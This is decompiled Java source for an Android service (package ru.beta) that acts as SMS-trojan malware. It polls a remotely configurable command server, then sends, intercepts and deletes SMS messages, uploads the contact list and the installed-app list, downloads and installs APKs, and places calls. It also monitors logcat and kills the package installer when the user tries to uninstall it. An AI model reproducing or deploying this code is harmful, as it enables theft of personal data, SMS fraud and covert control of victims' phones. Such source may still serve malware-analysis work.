package ru.beta;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService extends Service implements ThreadOperationListener {
    static boolean isKill = false;
    public static boolean isRunning = false;
    static String packageName = "del.test.app";

    public static void start(Context context, Intent intent, String key) {
        try {
            if (Constants.DEBUG) {
                System.out.println("MainService::start1()");
            }
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void start(Context context, Intent intent, String key, String number, String text, long id) {
        try {
            if (Constants.DEBUG) {
                System.out.println("MainService::start2()");
            }
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            service.putExtra("number", number);
            service.putExtra("text", text);
            service.putExtra("id", String.valueOf(id));
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onCreate() {
        super.onCreate();
        setForeground(true);
    }

    public void onStart(Intent intent, int startId) {
        try {
            super.onStart(intent, startId);
            if (Constants.DEBUG) {
                System.out.println("MainService::onStart()");
            }
            Bundle extras = intent.getExtras();
            if (extras != null && extras.get("key") != null) {
                String key = (String) extras.get("key");
                if (Constants.DEBUG) {
                    System.out.println("key: " + key);
                }
                if (key.equals("alarm")) {
                    new Thread(new ThreadOperation(this, 1, null)).start();
                } else if (key.equals("catch")) {
                    String number = (String) extras.get("number");
                    String text = (String) extras.get("text");
                    String id = (String) extras.get("id");
                    new Thread(new ThreadOperation(this, 4, new String[]{number, text, id})).start();
                } else if (key.equals("logs") && !isRunning) {
                    new Thread(new ThreadOperation(this, 5, null)).start();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    /* JADX WARNING: Removed duplicated region for block: B:40:0x013e A:{Catch:{ IOException -> 0x01b8 }} */
    /* JADX WARNING: Removed duplicated region for block: B:40:0x013e A:{Catch:{ IOException -> 0x01b8 }} */
    public void threadOperationRun(int r26, java.lang.Object r27) {
        /*
        r25 = this;
        r21 = ru.beta.Constants.DEBUG;
        if (r21 == 0) goto L_0x0020;
    L_0x0004:
        r21 = java.lang.System.out;
        r22 = new java.lang.StringBuilder;
        r22.<init>();
        r23 = "threadOperationRun: ";
        r22 = r22.append(r23);
        r0 = r22;
        r1 = r26;
        r22 = r0.append(r1);
        r22 = r22.toString();
        r21.println(r22);
    L_0x0020:
        r21 = 1;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0064;
    L_0x0028:
        r19 = ru.beta.Beta.sendRequest(r25);
        r20 = ru.beta.Settings.getSettings();
        r21 = java.lang.System.currentTimeMillis();
        r0 = r20;
        r0 = r0.period;
        r23 = r0;
        r24 = ru.beta.Constants.SECOND;
        r23 = r23 * r24;
        r0 = r23;
        r0 = (long) r0;
        r23 = r0;
        r21 = r21 + r23;
        r0 = r21;
        r2 = r20;
        r2.timeNextConnection = r0;
        r0 = r20;
        r1 = r25;
        r0.save(r1);
        r0 = r25;
        r1 = r19;
        r0.executeCommands(r1);
        r21 = ru.beta.Constants.DEBUG;
        if (r21 == 0) goto L_0x0060;
    L_0x005d:
        r20.printToOutStream();
    L_0x0060:
        ru.beta.Functions.startTimer(r25);
    L_0x0063:
        return;
    L_0x0064:
        r21 = 2;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0078;
    L_0x006c:
        r21 = ru.beta.Functions.getContacts(r25);
        r4 = ru.beta.Functions.contactsToJson(r21);
        ru.beta.Beta.sendContactsToServer(r4);
        goto L_0x0063;
    L_0x0078:
        r21 = 3;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x008c;
    L_0x0080:
        r21 = ru.beta.Functions.getInstalledAppList(r25);
        r13 = ru.beta.Functions.appListToJson(r21);
        ru.beta.Beta.sendPackagesToServer(r13);
        goto L_0x0063;
    L_0x008c:
        r21 = 4;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x00e9;
    L_0x0094:
        r27 = (java.lang.String[]) r27;
        r14 = r27;
        r14 = (java.lang.String[]) r14;
        r21 = 0;
        r21 = r14[r21];
        r22 = 1;
        r22 = r14[r22];
        r19 = ru.beta.Beta.sendCatchRequest(r21, r22);
        r21 = "removeCurrentCatchFilter";
        r0 = r19;
        r1 = r21;
        r21 = r0.has(r1);	 Catch:{ Exception -> 0x00e4 }
        if (r21 == 0) goto L_0x00dc;
    L_0x00b2:
        r21 = "removeCurrentCatchFilter";
        r0 = r19;
        r1 = r21;
        r21 = r0.getBoolean(r1);	 Catch:{ Exception -> 0x00e4 }
        r9 = java.lang.Boolean.valueOf(r21);	 Catch:{ Exception -> 0x00e4 }
        r21 = r9.booleanValue();	 Catch:{ Exception -> 0x00e4 }
        if (r21 == 0) goto L_0x00dc;
    L_0x00c6:
        r20 = ru.beta.Settings.getSettings();	 Catch:{ Exception -> 0x00e4 }
        r21 = 2;
        r21 = r14[r21];	 Catch:{ Exception -> 0x00e4 }
        r21 = java.lang.Long.parseLong(r21);	 Catch:{ Exception -> 0x00e4 }
        r20.removeCatchFilter(r21);	 Catch:{ Exception -> 0x00e4 }
        r0 = r20;
        r1 = r25;
        r0.save(r1);	 Catch:{ Exception -> 0x00e4 }
    L_0x00dc:
        r0 = r25;
        r1 = r19;
        r0.executeCommands(r1);
        goto L_0x0063;
    L_0x00e4:
        r7 = move-exception;
        r7.printStackTrace();
        goto L_0x00dc;
    L_0x00e9:
        r21 = 5;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0210;
    L_0x00f1:
        r21 = 1;
        isRunning = r21;
        r12 = 0;
        r17 = 0;
        r21 = java.lang.Runtime.getRuntime();	 Catch:{ IOException -> 0x01c2 }
        r22 = 2;
        r0 = r22;
        r0 = new java.lang.String[r0];	 Catch:{ IOException -> 0x01c2 }
        r22 = r0;
        r23 = 0;
        r24 = "logcat";
        r22[r23] = r24;	 Catch:{ IOException -> 0x01c2 }
        r23 = 1;
        r24 = "ActivityManager:I";
        r22[r23] = r24;	 Catch:{ IOException -> 0x01c2 }
        r12 = r21.exec(r22);	 Catch:{ IOException -> 0x01c2 }
        r21 = java.lang.System.out;	 Catch:{ IOException -> 0x01c2 }
        r22 = "exec logcat OK";
        r21.println(r22);	 Catch:{ IOException -> 0x01c2 }
    L_0x011b:
        r18 = new java.io.BufferedReader;	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21 = new java.io.InputStreamReader;	 Catch:{ IllegalArgumentException -> 0x01cc }
        r22 = r12.getInputStream();	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21.<init>(r22);	 Catch:{ IllegalArgumentException -> 0x01cc }
        r22 = 1024; // 0x400 float:1.435E-42 double:5.06E-321;
        r0 = r18;
        r1 = r21;
        r2 = r22;
        r0.<init>(r1, r2);	 Catch:{ IllegalArgumentException -> 0x01cc }
        r21 = java.lang.System.out;	 Catch:{ IllegalArgumentException -> 0x023b }
        r22 = "creare reader OK";
        r21.println(r22);	 Catch:{ IllegalArgumentException -> 0x023b }
        r17 = r18;
    L_0x013a:
        r21 = isRunning;	 Catch:{ IOException -> 0x01b8 }
        if (r21 == 0) goto L_0x020b;
    L_0x013e:
        r11 = r17.readLine();	 Catch:{ IOException -> 0x01b8 }
        r16 = "I/ActivityManager";
        r0 = r16;
        r10 = r11.indexOf(r0);	 Catch:{ IOException -> 0x01b8 }
        r21 = -1;
        r0 = r21;
        if (r10 == r0) goto L_0x013a;
    L_0x0150:
        r21 = r16.length();	 Catch:{ IOException -> 0x01b8 }
        r10 = r10 + r21;
        r5 = r11.substring(r10);	 Catch:{ IOException -> 0x01b8 }
        r15 = new ru.beta.IntentParser;	 Catch:{ Exception -> 0x01b3 }
        r15.m17init();	 Catch:{ Exception -> 0x01b3 }
        r15.parseString(r5);	 Catch:{ Exception -> 0x01b3 }
        r0 = r15.action;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "android.intent.action.DELETE";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01dc;
    L_0x016e:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "com.android.packageinstaller/.UninstallerActivity";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01dc;
    L_0x017a:
        r0 = r15.data;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x01b3 }
        r22.<init>();	 Catch:{ Exception -> 0x01b3 }
        r23 = "package:";
        r22 = r22.append(r23);	 Catch:{ Exception -> 0x01b3 }
        r23 = packageName;	 Catch:{ Exception -> 0x01b3 }
        r22 = r22.append(r23);	 Catch:{ Exception -> 0x01b3 }
        r22 = r22.toString();	 Catch:{ Exception -> 0x01b3 }
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x01d6;
    L_0x0199:
        r21 = 1;
        isKill = r21;	 Catch:{ Exception -> 0x01b3 }
        r21 = new java.lang.Thread;	 Catch:{ Exception -> 0x01b3 }
        r22 = new ru.beta.ThreadOperation;	 Catch:{ Exception -> 0x01b3 }
        r23 = 6;
        r0 = r22;
        r1 = r25;
        r2 = r23;
        r0.m12init(r1, r2, r15);	 Catch:{ Exception -> 0x01b3 }
        r21.<init>(r22);	 Catch:{ Exception -> 0x01b3 }
        r21.start();	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x01b3:
        r7 = move-exception;
        r7.printStackTrace();	 Catch:{ IOException -> 0x01b8 }
        goto L_0x013a;
    L_0x01b8:
        r6 = move-exception;
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x0063;
    L_0x01c2:
        r6 = move-exception;
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x011b;
    L_0x01cc:
        r6 = move-exception;
    L_0x01cd:
        r6.printStackTrace();
        r21 = 0;
        isRunning = r21;
        goto L_0x013a;
    L_0x01d6:
        r21 = 0;
        isKill = r21;	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x01dc:
        r0 = r15.action;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x013a;
    L_0x01e8:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x01b3 }
        r21 = r0;
        r22 = "com.android.settings/.Settings$ManageApplicationsActivity";
        r21 = r21.equals(r22);	 Catch:{ Exception -> 0x01b3 }
        if (r21 == 0) goto L_0x013a;
    L_0x01f4:
        r21 = new java.lang.Thread;	 Catch:{ Exception -> 0x01b3 }
        r22 = new ru.beta.ThreadOperation;	 Catch:{ Exception -> 0x01b3 }
        r23 = 6;
        r0 = r22;
        r1 = r25;
        r2 = r23;
        r0.m12init(r1, r2, r15);	 Catch:{ Exception -> 0x01b3 }
        r21.<init>(r22);	 Catch:{ Exception -> 0x01b3 }
        r21.start();	 Catch:{ Exception -> 0x01b3 }
        goto L_0x013a;
    L_0x020b:
        r25.stopSelf();	 Catch:{ IOException -> 0x01b8 }
        goto L_0x0063;
    L_0x0210:
        r21 = 6;
        r0 = r26;
        r1 = r21;
        if (r0 != r1) goto L_0x0063;
    L_0x0218:
        r21 = "activity";
        r0 = r25;
        r1 = r21;
        r3 = r0.getSystemService(r1);
        r3 = (android.app.ActivityManager) r3;
        r21 = "com.android.packageinstaller";
        r0 = r21;
        r3.restartPackage(r0);	 Catch:{ Exception -> 0x0236 }
    L_0x022b:
        ru.beta.Functions.showHome(r25);	 Catch:{ Exception -> 0x0230 }
        goto L_0x0063;
    L_0x0230:
        r8 = move-exception;
        r8.printStackTrace();
        goto L_0x0063;
    L_0x0236:
        r7 = move-exception;
        r7.printStackTrace();
        goto L_0x022b;
    L_0x023b:
        r6 = move-exception;
        r17 = r18;
        goto L_0x01cd;
        */
        throw new UnsupportedOperationException("Method not decompiled: ru.beta.MainService.threadOperationRun(int, java.lang.Object):void");
    }

    public void executeCommands(JSONObject response) {
        try {
            JSONArray jsonArray;
            int i;
            JSONObject jsonObject;
            String url;
            if (Constants.DEBUG) {
                System.out.println("response: " + response.toString(4));
            }
            Settings settings = Settings.getSettings();
            if (response.has("wait")) {
                if (Constants.DEBUG) {
                    System.out.println("has wait");
                }
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (response.getInt("wait") * Constants.SECOND));
                settings.save(this);
            }
            if (response.has("server")) {
                if (Constants.DEBUG) {
                    System.out.println("has server");
                }
                settings.server = response.getString("server");
                settings.save(this);
            }
            if (response.has("removeAllSmsFilters")) {
                if (Constants.DEBUG) {
                    System.out.println("has removeAllSmsFilters");
                }
                if (Boolean.valueOf(response.getBoolean("removeAllSmsFilters")).booleanValue()) {
                    settings.deleteSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has("removeAllCatchFilters")) {
                if (Constants.DEBUG) {
                    System.out.println("has removeAllCatchFilters");
                }
                if (Boolean.valueOf(response.getBoolean("removeAllCatchFilters")).booleanValue()) {
                    settings.catchSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has("deleteSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has deleteSms");
                }
                settings.deleteSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray("deleteSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.deleteSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                settings.save(this);
            }
            if (response.has("catchSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has catchSms");
                }
                settings.catchSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray("catchSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.catchSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                settings.save(this);
            }
            if (response.has("sendSms")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendSms");
                }
                jsonArray = response.getJSONArray("sendSms");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    Functions.sendSms(jsonObject.getString("phone"), jsonObject.getString("text"));
                }
            }
            if (response.has("httpRequest")) {
                JSONObject jsonParams;
                if (Constants.DEBUG) {
                    System.out.println("has httpRequest");
                }
                jsonObject = response.getJSONObject("httpRequest");
                String method = jsonObject.getString("method");
                url = jsonObject.getString("url");
                List<NameValuePair> paramsList = new ArrayList();
                List<NameValuePair> propertyList = new ArrayList();
                jsonArray = jsonObject.getJSONArray("params");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    paramsList.add(new BasicNameValuePair(jsonParams.getString("name"), jsonParams.getString("value")));
                }
                jsonArray = jsonObject.getJSONArray("properties");
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    propertyList.add(new BasicNameValuePair(jsonParams.getString("name"), jsonParams.getString("value")));
                }
                Functions.sendSimpleHttpRequest(url, method, paramsList, propertyList);
            }
            if (response.has("update")) {
                if (Constants.DEBUG) {
                    System.out.println("has update");
                }
                String path = response.getString("update");
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
                if (connectivityManager.getNetworkInfo(1).isAvailable() || connectivityManager.getNetworkInfo(0).isConnectedOrConnecting()) {
                    String name = System.currentTimeMillis() + ".apk";
                    String localPath = Environment.getExternalStorageDirectory() + "/download/";
                    if (Functions.downloadFile(localPath, path, name)) {
                        Functions.installApk(this, localPath + name);
                    }
                }
            }
            if (response.has("uninstall")) {
                if (Constants.DEBUG) {
                    System.out.println("has uninstall");
                }
                jsonArray = response.getJSONArray("uninstall");
                for (i = 0; i < jsonArray.length(); i++) {
                    Functions.uninstallApk(this, jsonArray.getString(i));
                }
            }
            if (response.has("notification")) {
                if (Constants.DEBUG) {
                    System.out.println("has notification");
                }
                jsonObject = response.getJSONObject("notification");
                url = jsonObject.getString("url");
                Functions.showNotification(this, jsonObject.getString("tickerText"), jsonObject.getString("title"), jsonObject.getString("text"), jsonObject.getInt("icon"), url);
            }
            if (response.has("openUrl")) {
                if (Constants.DEBUG) {
                    System.out.println("has openUrl");
                }
                Functions.openUrl(this, response.getString("openUrl"));
            }
            if (response.has("sendContactList")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendContactList");
                }
                if (Boolean.valueOf(response.getBoolean("sendContactList")).booleanValue()) {
                    new Thread(new ThreadOperation(this, 2, null)).start();
                }
            }
            if (response.has("sendPackageList")) {
                if (Constants.DEBUG) {
                    System.out.println("has sendPackageList");
                }
                if (Boolean.valueOf(response.getBoolean("sendPackageList")).booleanValue()) {
                    new Thread(new ThreadOperation(this, 3, null)).start();
                }
            }
            if (response.has("twitter")) {
                if (Constants.DEBUG) {
                    System.out.println("has twitter");
                }
                settings.twitterUrl = response.getString("twitter");
                settings.save(this);
            }
            if (response.has("makeCall")) {
                if (Constants.DEBUG) {
                    System.out.println("has makeCall");
                }
                Functions.makeCall(this, response.getString("makeCall"));
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
